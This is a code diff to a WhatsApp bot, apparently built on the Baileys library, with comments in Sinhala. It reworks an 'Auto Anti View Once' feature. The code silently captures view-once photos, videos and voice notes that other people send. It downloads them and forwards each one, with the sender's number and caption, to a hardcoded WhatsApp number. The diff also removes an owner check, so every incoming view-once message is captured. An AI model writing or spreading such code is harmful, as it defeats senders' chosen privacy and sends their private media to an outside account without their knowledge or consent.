@@ -1010,62 +1010,59 @@ await conn.readMessages([mek.key])
  * @param {Object} m - Message object (chat contextual data)
  */
 
-//================================== AUTO ANTI VIEW ONCE ========================================
-if (!isOwner) {
-    // View Once මැසේජ් එකක්ද කියා නිවැරදිව හඳුනා ගැනීම
-    const msg = mek.message;
-    const viewOnceMsg = msg?.viewOnceMessageV2?.message || msg?.viewOnceMessage?.message || msg?.viewOnceMessageV2Extension?.message;
+//================================== AUTO ANTI VIEW ONCE (FIXED) ========================================
+try {
+    // බොට් එකට එන ඕනෑම මැසේජ් ව්‍යුහයකින් (mek හෝ m) viewOnce කොටස සොයා ගැනීම
+    const currentMsg = mek?.message || (typeof m !== 'undefined' ? m?.message : null);
+    const viewOnceMsg = currentMsg?.viewOnceMessageV2?.message || 
+                        currentMsg?.viewOnceMessage?.message || 
+                        currentMsg?.viewOnceMessageV2Extension?.message;
 
     if (viewOnceMsg) {
-        try {
-            // මීඩියා වර්ගය හඳුනා ගැනීම (Image, Video, Audio)
-            const type = viewOnceMsg.imageMessage ? "image" : viewOnceMsg.videoMessage ? "video" : viewOnceMsg.audioMessage ? "audio" : null;
-            if (!type) return;
-
+        // මීඩියා වර්ගය හඳුනා ගැනීම
+        const type = viewOnceMsg.imageMessage ? "image" : viewOnceMsg.videoMessage ? "video" : viewOnceMsg.audioMessage ? "audio" : null;
+        
+        if (type) {
             const mediaContent = viewOnceMsg[`${type}Message`];
-            if (!mediaContent) return;
+            
+            if (mediaContent) {
+                // Baileys නිල ඩවුන්ලෝඩර් එක ඇතුලත් කිරීම
+                const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
 
-            // Baileys නිල ඩවුන්ලෝඩර් එක require කරගැනීම (ඉහලින් require කරල නැත්නම් විතරක්)
-            const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
+                // බෆර් එක ඩවුන්ලෝඩ් කිරීම
+                const stream = await downloadContentFromMessage(mediaContent, type);
+                let buffer = Buffer.from([]);
+                for await (const chunk of stream) {
+                    buffer = Buffer.concat([buffer, chunk]);
+                }
 
-            // මීඩියා බෆර් එක ඩවුන්ලෝඩ් කිරීම
-            const stream = await downloadContentFromMessage(mediaContent, type);
-            let buffer = Buffer.from([]);
-            for await (const chunk of stream) {
-                buffer = Buffer.concat([buffer, chunk]);
+                // එවපු කෙනාගේ විස්තර (sender ID එක ගන්නවා)
+                const senderId = mek?.key?.participant || mek?.key?.remoteJid || mek?.sender || (typeof m !== 'undefined' ? m?.sender : '');
+                const sentBy = senderId ? senderId.split('@')[0] : "Unknown";
+                const captionText = mediaContent.caption ? `\n\n> 🔓 Caption: ${mediaContent.caption}` : "";
+
+                // යැවිය යුතු මීඩියා ඔබ්ජෙක්ට් එක
+                let mediaObj = {};
+                mediaObj[type] = buffer;
+
+                if (type !== "audio") {
+                    mediaObj.caption = `👁‍🗨 *Anti-ViewOnce Detected !!*\n\n📩 *Sent by:* _${sentBy}_${captionText}`;
+                }
+
+                // ඔයාගේ නම්බර් එකට විතරක් PM යවනවා
+                const myTargetNumber = "94787318729@s.whatsapp.net";
+                const sentMedia = await conn.sendMessage(myTargetNumber, mediaObj);
+
+                // Audio එකක් නම් විස්තර ටික වෙනම මැසේජ් එකකින් යවනවා
+                if (type === "audio") {
+                    await conn.sendMessage(myTargetNumber, { text: `👁‍🗨 *Anti-ViewOnce Audio Detected !!*\n\n📩 *Sent by:* _${sentBy}_` }, { quoted: sentMedia });
+                }
             }
-
-            // එවපු කෙනාගේ විස්තර
-            const sentBynn = mek.key.participant || mek.key.remoteJid || mek.sender;
-            const sentBy = sentBynn.split('@')[0];
-            const captionText = mediaContent.caption ? `\n\n> 🔓 Caption: ${mediaContent.caption}` : "";
-
-            // යැවිය යුතු මීඩියා ඔබ්ජෙක්ට් එක සකස් කිරීම
-            let mediaObj = {};
-            mediaObj[type] = buffer; // කෙලින්ම බෆර් එක පාස් කරනවා (ෆයිල් සේව් කරන්න ඕනෙ නෑ)
-
-            if (type !== "audio") {
-                mediaObj.caption = `👁‍🗨 *Anti-ViewOnce Detected !!*\n\n📩 *Sent by:* _${sentBy}_${captionText}`;
-            }
-
-            // ඔයාගේ නම්බර් එකට විතරක් PM යවනවා
-            const myTargetNumber = "94787318729@s.whatsapp.net";
-            const sentMedia = await conn.sendMessage(myTargetNumber, mediaObj);
-
-            // Audio එකක් නම් විස්තර ටික වෙනම මැසේජ් එකකින් යවනවා
-            if (type === "audio") {
-                await conn.sendMessage(myTargetNumber, { text: `👁‍🗨 *Anti-ViewOnce Audio Detected !!*\n\n📩 *Sent by:* _${sentBy}_` }, { quoted: sentMedia });
-            }
-
-        } catch (error) {
-            console.error("Error in Auto Anti-ViewOnce:", error);
         }
     }
+} catch (error) {
+    console.error("Error in Auto Anti-ViewOnce Process:", error);
 }
-
-
-
-
 
 
 
